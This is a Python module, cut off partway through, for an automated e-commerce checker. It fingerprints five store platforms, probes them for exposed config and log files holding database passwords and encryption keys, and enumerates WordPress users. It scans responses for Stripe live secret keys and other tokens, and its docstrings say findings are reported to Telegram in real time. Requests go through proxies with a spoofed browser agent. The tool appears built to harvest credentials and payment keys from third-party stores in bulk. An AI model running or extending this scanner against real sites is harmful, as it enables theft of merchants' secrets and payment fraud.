"""
E-commerce Platform Checker — Shopify / WooCommerce / Magento / PrestaShop / OpenCart
Dedicated payment flow analysis for detected e-commerce platforms.

Features:
  - Platform detection (Shopify, WooCommerce, Magento, PrestaShop, OpenCart)
  - Public API enumeration (products, collections, cart, orders)
  - Admin/config endpoint probing for info disclosure
  - Payment gateway plugin detection
  - Exposed credentials/API key discovery in platform-specific locations
  - Checkout flow analysis + token extraction
  - Version detection + known vulnerability fingerprinting
  - Reports all findings to Telegram in real-time
"""

import re
import json
import time
import asyncio
import logging
from typing import Dict, List, Optional, Tuple, Set, Any
from dataclasses import dataclass, field
from urllib.parse import urljoin, urlparse, quote_plus
from datetime import datetime

import aiohttp

logger = logging.getLogger("ecommerce_checker")


# ╔══════════════════════════════════════════════════════════════════╗
# ║                    PLATFORM FINGERPRINTS                        ║
# ╚══════════════════════════════════════════════════════════════════╝

@dataclass
class PlatformFingerprint:
    """Rule for detecting an e-commerce platform."""
    platform: str
    check_type: str       # "header", "html", "cookie", "url"
    pattern: str          # Regex pattern
    confidence: float     # 0.0 - 1.0
    description: str = ""


PLATFORM_FINGERPRINTS: List[PlatformFingerprint] = [
    # ========== SHOPIFY ==========
    PlatformFingerprint("shopify", "header", r"X-ShopId", 0.95, "Shopify shop ID header"),
    PlatformFingerprint("shopify", "header", r"X-Shopify-Stage", 0.95, "Shopify stage header"),
    PlatformFingerprint("shopify", "header", r"X-Sorting-Hat-ShopId", 0.95, "Shopify sorting hat"),
    PlatformFingerprint("shopify", "header", r"X-Shopify-Request-Id", 0.90, "Shopify request ID"),
    PlatformFingerprint("shopify", "html", r'<meta\s+name=["\']generator["\']\s+content=["\']Shopify', 0.95, "Shopify meta generator"),
    PlatformFingerprint("shopify", "html", r'cdn\.shopify\.com', 0.90, "Shopify CDN"),
    PlatformFingerprint("shopify", "html", r'Shopify\.theme', 0.90, "Shopify theme JS"),
    PlatformFingerprint("shopify", "html", r'myshopify\.com', 0.85, "myshopify domain"),
    PlatformFingerprint("shopify", "cookie", r'_shopify_s', 0.90, "Shopify session cookie"),
    PlatformFingerprint("shopify", "cookie", r'_shopify_y', 0.90, "Shopify persistent cookie"),
    PlatformFingerprint("shopify", "url", r'/collections/', 0.40, "Shopify collections path"),

    # ========== WOOCOMMERCE ==========
    PlatformFingerprint("woocommerce", "html", r'woocommerce', 0.85, "WooCommerce class/string"),
    PlatformFingerprint("woocommerce", "html", r'wc-checkout', 0.90, "WooCommerce checkout"),
    PlatformFingerprint("woocommerce", "html", r'wp-content/plugins/woocommerce', 0.95, "WooCommerce plugin path"),
    PlatformFingerprint("woocommerce", "html", r'wc_add_to_cart_params', 0.90, "WooCommerce cart JS"),
    PlatformFingerprint("woocommerce", "html", r'class=["\']product type-product', 0.85, "WooCommerce product class"),
    PlatformFingerprint("woocommerce", "cookie", r'wp_woocommerce_session', 0.95, "WooCommerce session"),
    PlatformFingerprint("woocommerce", "cookie", r'woocommerce_cart_hash', 0.90, "WooCommerce cart hash"),
    PlatformFingerprint("woocommerce", "header", r'X-WC-', 0.90, "WooCommerce header"),
    PlatformFingerprint("woocommerce", "html", r'wp-json/wc/', 0.90, "WooCommerce REST API ref"),

    # ========== MAGENTO ==========
    PlatformFingerprint("magento", "html", r'Mage\.Cookies', 0.90, "Magento Cookies JS"),
    PlatformFingerprint("magento", "html", r'Magento_Ui', 0.90, "Magento UI module"),
    PlatformFingerprint("magento", "html", r'/static/version\d+/', 0.85, "Magento static versioning"),
    PlatformFingerprint("magento", "html", r'skin/frontend/', 0.80, "Magento 1.x skin path"),
    PlatformFingerprint("magento", "html", r'Magento_Theme', 0.85, "Magento Theme module"),
    PlatformFingerprint("magento", "header", r'X-Magento-', 0.95, "Magento X-header"),
    PlatformFingerprint("magento", "cookie", r'PHPSESSID', 0.20, "PHP session (weak signal)"),
    PlatformFingerprint("magento", "cookie", r'mage-cache-', 0.90, "Magento cache cookie"),
    PlatformFingerprint("magento", "cookie", r'form_key', 0.70, "Magento form key"),
    PlatformFingerprint("magento", "html", r'checkout/cart', 0.50, "Magento cart path"),
    PlatformFingerprint("magento", "html", r'catalogsearch/result', 0.70, "Magento catalog search"),

    # ========== PRESTASHOP ==========
    PlatformFingerprint("prestashop", "html", r'PrestaShop', 0.90, "PrestaShop string"),
    PlatformFingerprint("prestashop", "html", r'prestashop', 0.80, "PrestaShop lowercase"),
    PlatformFingerprint("prestashop", "html", r'/modules/ps_', 0.90, "PrestaShop module path"),
    PlatformFingerprint("prestashop", "html", r'prestashop\.js', 0.90, "PrestaShop JS"),
    PlatformFingerprint("prestashop", "cookie", r'PrestaShop-', 0.95, "PrestaShop cookie"),
    PlatformFingerprint("prestashop", "header", r'X-Powered-By.*PrestaShop', 0.95, "PrestaShop powered-by"),

    # ========== OPENCART ==========
    PlatformFingerprint("opencart", "html", r'catalog/view/theme', 0.85, "OpenCart theme path"),
    PlatformFingerprint("opencart", "html", r'route=common/home', 0.85, "OpenCart route"),
    PlatformFingerprint("opencart", "html", r'route=checkout', 0.80, "OpenCart checkout route"),
    PlatformFingerprint("opencart", "html", r'OpenCart', 0.80, "OpenCart string"),
    PlatformFingerprint("opencart", "cookie", r'OCSESSID', 0.95, "OpenCart session cookie"),
    PlatformFingerprint("opencart", "html", r'index\.php\?route=', 0.75, "OpenCart route URL"),
]

# Pre-compile fingerprint regexes
_COMPILED_FINGERPRINTS: List[Tuple[PlatformFingerprint, re.Pattern]] = [
    (fp, re.compile(fp.pattern, re.IGNORECASE))
    for fp in PLATFORM_FINGERPRINTS
]


# ╔══════════════════════════════════════════════════════════════════╗
# ║                  PLATFORM PROBE ENDPOINTS                       ║
# ╚══════════════════════════════════════════════════════════════════╝

@dataclass
class ProbeEndpoint:
    """An endpoint to probe on a specific e-commerce platform."""
    platform: str
    path: str
    method: str = "GET"           # GET or HEAD
    expect_json: bool = False     # Expect JSON response
    severity: str = "medium"      # Finding severity
    category: str = "info"        # info, api, config, credential, checkout, admin
    description: str = ""
    # If response matches this regex, it's a finding
    success_pattern: str = ""
    # Specific data extraction regex (capture group 1 = extracted value)
    extract_pattern: str = ""


PLATFORM_PROBES: List[ProbeEndpoint] = [
    # ========== SHOPIFY PROBES ==========
    ProbeEndpoint(
        "shopify", "/products.json", expect_json=True,
        severity="medium", category="api",
        description="Shopify products API (public)",
        success_pattern=r'"products"\s*:',
        extract_pattern=r'"vendor"\s*:\s*"([^"]+)"',
    ),
    ProbeEndpoint(
        "shopify", "/collections.json", expect_json=True,
        severity="medium", category="api",
        description="Shopify collections API (public)",
        success_pattern=r'"collections"\s*:',
    ),
    ProbeEndpoint(
        "shopify", "/cart.json", expect_json=True,
        severity="low", category="checkout",
        description="Shopify cart API",
        success_pattern=r'"token"\s*:',
        extract_pattern=r'"token"\s*:\s*"([^"]+)"',
    ),
    ProbeEndpoint(
        "shopify", "/meta.json", expect_json=True,
        severity="medium", category="info",
        description="Shopify store metadata",
        success_pattern=r'"name"\s*:',
    ),
    ProbeEndpoint(
        "shopify", "/admin/auth/login", method="HEAD",
        severity="high", category="admin",
        description="Shopify admin login accessible",
        success_pattern=r'(?:login|sign.?in|admin)',
    ),
    ProbeEndpoint(
        "shopify", "/.well-known/shopify/monorail/unstable/produce_batch",
        severity="medium", category="info",
        description="Shopify Monorail analytics endpoint",
        success_pattern=r'.',  # Any response = exists
    ),
    ProbeEndpoint(
        "shopify", "/checkouts.json",
        severity="high", category="checkout",
        description="Shopify checkouts endpoint (usually protected)",
        success_pattern=r'"checkouts"',
    ),
    ProbeEndpoint(
        "shopify", "/storefront-renderer/render",
        severity="medium", category="api",
        description="Shopify storefront renderer",
        success_pattern=r'.',
    ),

    # ========== WOOCOMMERCE PROBES ==========
    ProbeEndpoint(
        "woocommerce", "/wp-json/wc/v3/products",
        expect_json=True, severity="high", category="api",
        description="WooCommerce Products API (needs auth, but may be open)",
        success_pattern=r'\[.*"name"',
    ),
    ProbeEndpoint(
        "woocommerce", "/wp-json/wc/v3/",
        expect_json=True, severity="high", category="api",
        description="WooCommerce REST API root",
        success_pattern=r'"namespace"\s*:\s*"wc/v3"',
    ),
    ProbeEndpoint(
        "woocommerce", "/wp-json/wc/v3/system_status",
        expect_json=True, severity="high", category="config",
        description="WooCommerce system status (often exposed)",
        success_pattern=r'"environment"',
        extract_pattern=r'"version"\s*:\s*"([^"]+)"',
    ),
    ProbeEndpoint(
        "woocommerce", "/?wc-ajax=get_refreshed_fragments",
        severity="medium", category="api",
        description="WooCommerce AJAX cart fragments",
        success_pattern=r'cart_hash|fragments',
    ),
    ProbeEndpoint(
        "woocommerce", "/wp-content/debug.log", method="GET",
        severity="high", category="credential",
        description="WordPress debug log (may contain errors, paths, creds)",
        success_pattern=r'(?:PHP\s+(?:Fatal|Warning|Notice)|Stack trace)',
    ),
    ProbeEndpoint(
        "woocommerce", "/wp-json/wp/v2/users",
        expect_json=True, severity="high", category="info",
        description="WordPress users API (user enumeration)",
        success_pattern=r'\[.*"name"',
        extract_pattern=r'"slug"\s*:\s*"([^"]+)"',
    ),
    ProbeEndpoint(
        "woocommerce", "/wp-json/", expect_json=True,
        severity="medium", category="api",
        description="WordPress REST API root",
        success_pattern=r'"name"\s*:',
        extract_pattern=r'"name"\s*:\s*"([^"]*)"',
    ),
    ProbeEndpoint(
        "woocommerce", "/wp-login.php", method="HEAD",
        severity="medium", category="admin",
        description="WordPress admin login page",
        success_pattern=r'(?:wp-login|log.?in)',
    ),
    ProbeEndpoint(
        "woocommerce", "/xmlrpc.php", method="GET",
        severity="high", category="config",
        description="WordPress XML-RPC (bruteforce/SSRF vector)",
        success_pattern=r'XML-RPC server accepts POST requests only',
    ),
    ProbeEndpoint(
        "woocommerce", "/.env", method="GET",
        severity="high", category="credential",
        description="Exposed .env file (may contain DB creds, API keys)",
        success_pattern=r'(?:DB_PASSWORD|APP_KEY|SECRET|API_KEY|STRIPE)',
    ),
    ProbeEndpoint(
        "woocommerce", "/wp-config.php.bak", method="GET",
        severity="high", category="credential",
        description="WordPress config backup (DB credentials)",
        success_pattern=r'(?:DB_NAME|DB_USER|DB_PASSWORD|table_prefix)',
    ),

    # ========== MAGENTO PROBES ==========
    ProbeEndpoint(
        "magento", "/rest/V1/store/storeConfigs",
        expect_json=True, severity="high", category="config",
        description="Magento store configuration (public API)",
        success_pattern=r'"base_currency_code"',
        extract_pattern=r'"base_url"\s*:\s*"([^"]+)"',
    ),
    ProbeEndpoint(
        "magento", "/rest/V1/directory/countries",
        expect_json=True, severity="medium", category="api",
        description="Magento directory countries API",
        success_pattern=r'"id"\s*:.*"full_name_english"',
    ),
    ProbeEndpoint(
        "magento", "/rest/V1/customers/me",
        severity="medium", category="api",
        description="Magento customer API (auth check)",
        success_pattern=r'"message"',
    ),
    ProbeEndpoint(
        "magento", "/magento_version",
        severity="high", category="info",
        description="Magento version disclosure",
        success_pattern=r'Magento/\d',
        extract_pattern=r'(Magento/[\d.]+)',
    ),
    ProbeEndpoint(
        "magento", "/downloader/",
        severity="high", category="admin",
        description="Magento Connect Manager (Magento 1.x)",
        success_pattern=r'(?:Magento\s+Connect|downloader)',
    ),
    ProbeEndpoint(
        "magento", "/app/etc/local.xml",
        severity="high", category="credential",
        description="Magento 1.x local config (DB creds, encryption key)",
        success_pattern=r'(?:<connection>|<crypt>|<key>)',
        extract_pattern=r'<key><!\[CDATA\[([^\]]+)\]',
    ),
    ProbeEndpoint(
        "magento", "/app/etc/env.php",
        severity="high", category="credential",
        description="Magento 2.x env config (DB creds, encryption key)",
        success_pattern=r"(?:'db'|'crypt'|'key'|'password')",
    ),
    ProbeEndpoint(
        "magento", "/admin",
        severity="medium", category="admin",
        description="Magento admin panel",
        success_pattern=r'(?:admin|login|sign.?in)',
    ),
    ProbeEndpoint(
        "magento", "/var/log/system.log",
        severity="high", category="credential",
        description="Magento system log (may leak paths/errors)",
        success_pattern=r'(?:\.CRITICAL|\.ERROR|main\.)',
    ),
    ProbeEndpoint(
        "magento", "/.env", method="GET",
        severity="high", category="credential",
        description="Exposed .env file",
        success_pattern=r'(?:DB_PASSWORD|MAGE|MAGENTO|SECRET)',
    ),

    # ========== PRESTASHOP PROBES ==========
    ProbeEndpoint(
        "prestashop", "/api/", expect_json=False,
        severity="high", category="api",
        description="PrestaShop Web Service API root",
        success_pattern=r'(?:prestashop|api)',
    ),
    ProbeEndpoint(
        "prestashop", "/api/products",
        severity="high", category="api",
        description="PrestaShop products API",
        success_pattern=r'(?:product|products)',
    ),
    ProbeEndpoint(
        "prestashop", "/admin/", method="HEAD",
        severity="medium", category="admin",
        description="PrestaShop admin panel",
        success_pattern=r'(?:admin|login|PrestaShop)',
    ),
    ProbeEndpoint(
        "prestashop", "/config/settings.inc.php",
        severity="high", category="credential",
        description="PrestaShop config file (DB creds)",
        success_pattern=r'(?:_DB_PASSWD_|_DB_SERVER_|_COOKIE_KEY_)',
    ),
    ProbeEndpoint(
        "prestashop", "/.env", method="GET",
        severity="high", category="credential",
        description="Exposed .env file",
        success_pattern=r'(?:DB_PASSWORD|APP_SECRET|PRESTA)',
    ),

    # ========== OPENCART PROBES ==========
    ProbeEndpoint(
        "opencart", "/admin/", method="HEAD",
        severity="medium", category="admin",
        description="OpenCart admin panel",
        success_pattern=r'(?:admin|login|OpenCart)',
    ),
    ProbeEndpoint(
        "opencart", "/index.php?route=api/",
        severity="high", category="api",
        description="OpenCart API endpoint",
        success_pattern=r'.',
    ),
    ProbeEndpoint(
        "opencart", "/config.php.bak",
        severity="high", category="credential",
        description="OpenCart config backup (DB creds)",
        success_pattern=r'(?:DB_PASSWORD|DB_PREFIX|DB_DATABASE)',
    ),
    ProbeEndpoint(
        "opencart", "/system/storage/logs/error.log",
        severity="high", category="credential",
        description="OpenCart error log (info disclosure)",
        success_pattern=r'(?:PHP\s+(?:Fatal|Warning|Notice)|Error)',
    ),
]


# ╔══════════════════════════════════════════════════════════════════╗
# ║              PAYMENT GATEWAY PLUGIN DETECTION                   ║
# ╚══════════════════════════════════════════════════════════════════╝

# Platform-specific gateway plugin signatures in HTML/JS
PLATFORM_GATEWAY_PLUGINS: Dict[str, List[Tuple[str, str, str]]] = {
    # (regex_pattern, gateway_name, description)
    "shopify": [
        (r"Shopify\.Checkout\..*stripe", "stripe", "Shopify + Stripe checkout"),
        (r"shopify_pay", "shopify_payments", "Shopify Payments (native)"),
        (r"paypal.*express.*checkout", "paypal", "PayPal Express Checkout"),
        (r"shop\.app/pay|shop_pay", "shop_pay", "Shop Pay (Shopify)"),
        (r"afterpay|clearpay", "afterpay", "Afterpay/Clearpay BNPL"),
        (r"klarna", "klarna", "Klarna BNPL"),
        (r"sezzle", "sezzle", "Sezzle BNPL"),
        (r"amazon.*pay|amzn.*pay", "amazon_pay", "Amazon Pay"),
        (r"apple-pay|applepay|ApplePaySession", "apple_pay", "Apple Pay"),
        (r"google-pay|googlepay|PaymentRequest", "google_pay", "Google Pay"),
    ],
    "woocommerce": [
        (r"wc-stripe|woocommerce-gateway-stripe", "stripe", "WooCommerce Stripe Gateway"),
        (r"wc-paypal|woocommerce-paypal", "paypal", "WooCommerce PayPal Gateway"),
        (r"wc-braintree|woocommerce-gateway-paypal-powered-by-braintree", "braintree", "WooCommerce Braintree"),
        (r"wc-square|woocommerce-square", "square", "WooCommerce Square"),
        (r"wc-authorize-net|woocommerce-gateway-authorize-net", "authorize_net", "WooCommerce Authorize.net"),
        (r"wc-checkout-com|checkout-com-unified", "checkout_com", "WooCommerce Checkout.com"),
        (r"wc-mollie|mollie-payments-for-woocommerce", "mollie", "WooCommerce Mollie"),
        (r"wc-razorpay|razorpay-for-woocommerce", "razorpay", "WooCommerce Razorpay"),
        (r"wc-klarna|klarna-checkout-for-woocommerce", "klarna", "WooCommerce Klarna"),
        (r"wc-worldpay|woocommerce-gateway-worldpay", "worldpay", "WooCommerce Worldpay"),
    ],
    "magento": [
        (r"Magento_Paypal|paypal/express", "paypal", "Magento PayPal"),
        (r"StripeIntegration|Stripe_Payments", "stripe", "Magento Stripe"),
        (r"Magento_Braintree|braintree-payments", "braintree", "Magento Braintree"),
        (r"adyen-checkout|Adyen_Payment", "adyen", "Magento Adyen"),
        (r"AuthorizeNet|authorizenet", "authorize_net", "Magento Authorize.net"),
        (r"amazon-payments|Amazon_Payment", "amazon_pay", "Magento Amazon Pay"),
        (r"klarna|Klarna_Kp", "klarna", "Magento Klarna"),
        (r"worldpay|Sapient_Worldpay", "worldpay", "Magento Worldpay"),
    ],
    "prestashop": [
        (r"ps_checkout|prestashop-checkout", "paypal", "PrestaShop Checkout (PayPal-powered)"),
        (r"stripe_official", "stripe", "PrestaShop Stripe Official"),
        (r"mollie", "mollie", "PrestaShop Mollie"),
        (r"payplug", "payplug", "PrestaShop PayPlug"),
        (r"adyen", "adyen", "PrestaShop Adyen"),
    ],
    "opencart": [
        (r"payment/pp_express|paypal", "paypal", "OpenCart PayPal"),
        (r"payment/stripe|stripe", "stripe", "OpenCart Stripe"),
        (r"payment/sagepay|sagepay", "sagepay", "OpenCart SagePay"),
        (r"payment/worldpay", "worldpay", "OpenCart Worldpay"),
    ],
}


# ╔══════════════════════════════════════════════════════════════════╗
# ║                SHOPIFY KEY / TOKEN PATTERNS                     ║
# ╚══════════════════════════════════════════════════════════════════╝

ECOM_SECRET_PATTERNS: List[Tuple[str, str, str, str]] = [
    # (regex, platform, type_name, severity)
    # Shopify
    (r'shpat_[a-fA-F0-9]{32}', "shopify", "Shopify Admin API token", "high"),
    (r'shpca_[a-fA-F0-9]{32}', "shopify", "Shopify Custom App token", "high"),
    (r'shppa_[a-fA-F0-9]{32}', "shopify", "Shopify Partner API token", "high"),
    (r'shpss_[a-fA-F0-9]{32}', "shopify", "Shopify Shared Secret", "high"),
    (r'["\']?(X-Shopify-Access-Token)["\']?\s*[:=]\s*["\']([a-fA-F0-9]{32,})', "shopify", "Shopify Access Token in code", "high"),
    (r'Storefront-Access-Token["\']?\s*[:=]\s*["\']([a-fA-F0-9]{30,})', "shopify", "Shopify Storefront Token", "high"),

    # WooCommerce / WordPress
    (r'wc_consumer_key\s*[=:]\s*["\']?(ck_[a-fA-F0-9]{40})', "woocommerce", "WooCommerce Consumer Key", "high"),
    (r'wc_consumer_secret\s*[=:]\s*["\']?(cs_[a-fA-F0-9]{40})', "woocommerce", "WooCommerce Consumer Secret", "high"),
    (r'define\s*\(\s*["\']AUTH_KEY["\']\s*,\s*["\']([^"\']{20,})', "woocommerce", "WordPress AUTH_KEY", "high"),
    (r'define\s*\(\s*["\']DB_PASSWORD["\']\s*,\s*["\']([^"\']+)', "woocommerce", "WordPress DB Password", "high"),

    # Magento
    (r"'key'\s*=>\s*'([a-fA-F0-9]{32})'", "magento", "Magento Encryption Key", "high"),
    (r"'password'\s*=>\s*'([^']+)'", "magento", "Magento DB Password", "high"),
    (r'MAGENTO_ADMIN_PASSWORD\s*=\s*(\S+)', "magento", "Magento Admin Password", "high"),
    (r'MAGE_KEY\s*=\s*(\S+)', "magento", "Magento Key env var", "high"),

    # PrestaShop
    (r"_COOKIE_KEY_\s*',\s*'([^']+)", "prestashop", "PrestaShop Cookie Key", "high"),
    (r"_DB_PASSWD_\s*',\s*'([^']+)", "prestashop", "PrestaShop DB Password", "high"),
    (r"_RIJNDAEL_KEY_\s*',\s*'([^']+)", "prestashop", "PrestaShop Encryption Key", "high"),

    # Generic
    (r'(sk_live_[a-zA-Z0-9]{24,})', "generic", "Stripe Live Secret Key", "high"),
    (r'(pk_live_[a-zA-Z0-9]{24,})', "generic", "Stripe Live Publishable Key", "medium"),
    (r'(sk_test_[a-zA-Z0-9]{24,})', "generic", "Stripe Test Secret Key", "medium"),
    (r'(rk_live_[a-zA-Z0-9]{24,})', "generic", "Stripe Restricted Key", "high"),
]

_COMPILED_SECRETS: List[Tuple[re.Pattern, str, str, str]] = [
    (re.compile(pat, re.IGNORECASE), plat, name, sev)
    for pat, plat, name, sev in ECOM_SECRET_PATTERNS
]


# ╔══════════════════════════════════════════════════════════════════╗
# ║                       DATA CLASSES                              ║
# ╚══════════════════════════════════════════════════════════════════╝

@dataclass
class EcomFinding:
    """A single finding from e-commerce analysis."""
    url: str
    domain: str
    platform: str
    category: str           # info, api, config, credential, checkout, admin, gateway, secret
    severity: str           # high, medium, low
    title: str
    description: str
    data: Dict[str, Any] = field(default_factory=dict)
    found_at: str = field(default_factory=lambda: datetime.now().isoformat())


@dataclass
class PlatformInfo:
    """Detected e-commerce platform info."""
    name: str
    confidence: float
    version: str = ""
    fingerprints: List[str] = field(default_factory=list)


@dataclass
class EcomResult:
    """Full e-commerce check result for a domain."""
    url: str
    domain: str
    platforms: List[PlatformInfo] = field(default_factory=list)
    findings: List[EcomFinding] = field(default_factory=list)
    gateway_plugins: List[EcomFinding] = field(default_factory=list)
    secrets_found: List[EcomFinding] = field(default_factory=list)
    check_time: float = 0.0
    error: str = ""

    @property
    def primary_platform(self) -> Optional[PlatformInfo]:
        if self.platforms:
            return max(self.platforms, key=lambda p: p.confidence)
        return None

    @property
    def total_findings(self) -> int:
        return len(self.findings) + len(self.gateway_plugins) + len(self.secrets_found)

    @property
    def has_critical(self) -> bool:
        return any(
            f.severity == "high"
            for f in self.findings + self.gateway_plugins + self.secrets_found
        )


@dataclass
class CheckerStats:
    """Cumulative stats for the e-commerce checker."""
    urls_checked: int = 0
    platforms_detected: Dict[str, int] = field(default_factory=dict)
    findings_by_category: Dict[str, int] = field(default_factory=dict)
    findings_by_severity: Dict[str, int] = field(default_factory=dict)
    gateways_detected: Dict[str, int] = field(default_factory=dict)
    secrets_found: int = 0
    credentials_found: int = 0
    errors: int = 0
    total_check_time: float = 0.0


# ╔══════════════════════════════════════════════════════════════════╗
# ║                    ECOMMERCE CHECKER                            ║
# ╚══════════════════════════════════════════════════════════════════╝

class EcommerceChecker:
    """
    Dedicated e-commerce platform checker.
    
    Strategy:
    1. Detect e-commerce platform from headers, HTML, cookies
    2. Run platform-specific endpoint probes (APIs, configs, admin panels)
    3. Detect payment gateway plugins from HTML/JS
    4. Search response bodies for exposed API keys/credentials
    5. Report each high-value finding to Telegram immediately
    """

    def __init__(self, config=None, reporter=None, db=None, proxy_manager=None):
        self.config = config
        self.reporter = reporter
        self.db = db
        self.proxy_manager = proxy_manager
        self.stats = CheckerStats()

        # Dedup — don't report same finding@domain twice
        self._reported: Set[str] = set()
        self._last_report_time: float = 0
        self._min_report_interval: float = 0.5

        # Config-driven limits
        self._max_probes = getattr(config, 'ecom_max_probes', 15) if config else 15
        self._probe_timeout = getattr(config, 'ecom_probe_timeout', 10) if config else 10
        self._enabled_platforms = (
            getattr(config, 'ecom_platforms', ["shopify", "woocommerce", "magento", "prestashop", "opencart"])
            if config else ["shopify", "woocommerce", "magento", "prestashop", "opencart"]
        )

        logger.info(f"EcommerceChecker initialized — platforms: {', '.join(self._enabled_platforms)}")

    # ════════════════════ MAIN CHECK ════════════════════

    async def check_url(
        self, url: str, session: aiohttp.ClientSession = None,
        html_body: str = "", resp_headers: Dict[str, str] = None,
        cookies: Dict[str, str] = None,
    ) -> EcomResult:
        """
        Full e-commerce check on a URL.
        
        Can accept pre-fetched data (html, headers, cookies) from the pipeline
        to avoid re-fetching the page.
        
        Args:
            url: Target URL
            session: Optional shared session
            html_body: Pre-fetched HTML (saves a request)
            resp_headers: Pre-fetched response headers
            cookies: Pre-fetched cookies
            
        Returns:
            EcomResult with all findings
        """
        domain = urlparse(url).netloc
        result = EcomResult(url=url, domain=domain)
        start = time.monotonic()

        own_session = False
        if session is None:
            timeout = aiohttp.ClientTimeout(total=20)
            connector = aiohttp.TCPConnector(ssl=False, limit=10)
            session = aiohttp.ClientSession(timeout=timeout, connector=connector)
            own_session = True

        try:
            # Step 1: Fetch page if not pre-fetched
            if not html_body:
                html_body, resp_headers, cookies = await self._fetch_page(url, session)

            if resp_headers is None:
                resp_headers = {}
            if cookies is None:
                cookies = {}

            # Step 2: Detect platform
            result.platforms = self._detect_platforms(html_body, resp_headers, cookies)

            if not result.platforms:
                # No e-commerce platform detected — skip probing
                self.stats.urls_checked += 1
                return result

            primary = result.primary_platform
            if primary:
                self.stats.platforms_detected[primary.name] = (
                    self.stats.platforms_detected.get(primary.name, 0) + 1
                )
                logger.info(
                    f"🛍️ E-commerce detected [{domain}]: {primary.name} "
                    f"(confidence: {primary.confidence:.0%})"
                )

            # Step 3: Run platform-specific probes
            for platform_info in result.platforms:
                if platform_info.name not in self._enabled_platforms:
                    continue
                if platform_info.confidence < 0.50:
                    continue
                probes = [p for p in PLATFORM_PROBES if p.platform == platform_info.name]
                probe_results = await self._run_probes(
                    url, domain, platform_info.name, probes, session
                )
                result.findings.extend(probe_results)

            # Step 4: Detect payment gateway plugins
            for platform_info in result.platforms:
                if platform_info.name in PLATFORM_GATEWAY_PLUGINS:
                    gateway_finds = self._detect_gateway_plugins(
                        url, domain, platform_info.name, html_body
                    )
                    result.gateway_plugins.extend(gateway_finds)

            # Step 5: Scan for exposed secrets/keys in all fetched content
            secret_finds = self._scan_for_secrets(url, domain, html_body)
            result.secrets_found.extend(secret_finds)

            # Update stats
            self.stats.urls_checked += 1
            for f in result.findings:
                self.stats.findings_by_category[f.category] = (
                    self.stats.findings_by_category.get(f.category, 0) + 1
                )
                self.stats.findings_by_severity[f.severity] = (
                    self.stats.findings_by_severity.get(f.severity, 0) + 1
                )
            for gf in result.gateway_plugins:
                gw = gf.data.get("gateway", "unknown")
                self.stats.gateways_detected[gw] = (
                    self.stats.gateways_detected.get(gw, 0) + 1
                )
            self.stats.secrets_found += len(result.secrets_found)
            self.stats.credentials_found += sum(
                1 for f in result.findings if f.category == "credential"
            )

        except asyncio.TimeoutError:
            result.error = "timeout"
            self.stats.errors += 1
        except aiohttp.ClientError as e:
            result.error = str(e)
            self.stats.errors += 1
        except Exception as e:
            result.error = str(e)
            self.stats.errors += 1
            logger.error(f"EcommerceChecker error [{domain}]: {e}")
        finally:
            result.check_time = time.monotonic() - start
            self.stats.total_check_time += result.check_time
            if own_session:
                await session.close()

        return result

    async def check_and_report(
        self, url: str, session: aiohttp.ClientSession = None,
        html_body: str = "", resp_headers: Dict[str, str] = None,
        cookies: Dict[str, str] = None,
    ) -> EcomResult:
        """Check a URL and report all findings to Telegram. Main pipeline entry point."""
        result = await self.check_url(url, session, html_body, resp_headers, cookies)

        if result.total_findings > 0:
            await self._report_findings(result)
            logger.info(
                f"🛍️ EcomCheck [{result.domain}]: "
                f"{len(result.findings)} probes, "
                f"{len(result.gateway_plugins)} gateways, "
                f"{len(result.secrets_found)} secrets"
            )

        return result

    # ════════════════════ FETCH ════════════════════

    async def _fetch_page(
        self, url: str, session: aiohttp.ClientSession
    ) -> Tuple[str, Dict[str, str], Dict[str, str]]:
        """Fetch a URL and return (html, headers, cookies)."""
        proxy_url = None
        if self.proxy_manager:
            domain = urlparse(url).netloc
            proxy_info = await self.proxy_manager.get_proxy(domain=domain)
            if proxy_info:
                proxy_url = proxy_info.url

        headers = {
            "User-Agent": (
                "Mozilla/5.0 (Windows NT 10.0; Win64; x64) "
                "AppleWebKit/537.36 (KHTML, like Gecko) "
                "Chrome/120.0.0.0 Safari/537.36"
            ),
            "Accept": "text/html,application/xhtml+xml,*/*;q=0.9",
            "Accept-Language": "en-US,en;q=0.9",
        }

        html_body = ""
        resp_headers: Dict[str, str] = {}
        cookies_found: Dict[str, str] = {}

        async with session.get(
            url, headers=headers, proxy=proxy_url,
            allow_redirects=True, max_redirects=5, ssl=False,
        ) as resp:
            for key, value in resp.headers.items():
                resp_headers[key] = value
            for cookie_header in resp.headers.getall("Set-Cookie", []):
                parts = cookie_header.split(";")[0]
                if "=" in parts:
                    name, _, value = parts.partition("=")
                    cookies_found[name.strip()] = value.strip()
            for cookie in session.cookie_jar:
                cookies_found[cookie.key] = cookie.value

            content_type = resp.headers.get("Content-Type", "")
            if "text/html" in content_type or "application/xhtml" in content_type:
                try:
                    html_body = await resp.text(errors="replace")
                    if len(html_body) > 300_000:
                        html_body = html_body[:300_000]
                except Exception:
                    html_body = ""

        return html_body, resp_headers, cookies_found

    # ════════════════════ DETECTION ════════════════════

    def _detect_platforms(
        self, html: str, headers: Dict[str, str], cookies: Dict[str, str]
    ) -> List[PlatformInfo]:
        """Detect e-commerce platforms from page content."""
        platform_scores: Dict[str, float] = {}
        platform_fps: Dict[str, List[str]] = {}

        for fp, compiled in _COMPILED_FINGERPRINTS:
            if fp.platform not in self._enabled_platforms:
                continue

            matched = False
            if fp.check_type == "html" and html:
                if compiled.search(html):
                    matched = True
            elif fp.check_type == "header":
                for hdr_name in headers:
                    if compiled.search(hdr_name):
                        matched = True
                        break
            elif fp.check_type == "cookie":
                for cookie_name in cookies:
                    if compiled.search(cookie_name):
                        matched = True
                        break
            elif fp.check_type == "url":
                if compiled.search(html):
                    matched = True

            if matched:
                current = platform_scores.get(fp.platform, 0)
                # Use max rather than sum to avoid overshoot, but add a small bonus for multiples
                if current == 0:
                    platform_scores[fp.platform] = fp.confidence
                else:
                    platform_scores[fp.platform] = min(
                        0.99, current + (1.0 - current) * fp.confidence * 0.3
                    )
                if fp.platform not in platform_fps:
                    platform_fps[fp.platform] = []
                platform_fps[fp.platform].append(fp.description)

        results = []
        for platform, score in platform_scores.items():
            if score >= 0.40:  # Minimum confidence threshold
                info = PlatformInfo(
                    name=platform,
                    confidence=score,
                    fingerprints=platform_fps.get(platform, []),
                )
                results.append(info)

        # Sort by confidence descending
        results.sort(key=lambda p: -p.confidence)
        return results

    # ════════════════════ PROBING ════════════════════

    async def _run_probes(
        self, base_url: str, domain: str, platform: str,
        probes: List[ProbeEndpoint], session: aiohttp.ClientSession,
    ) -> List[EcomFinding]:
        """Run platform-specific endpoint probes."""
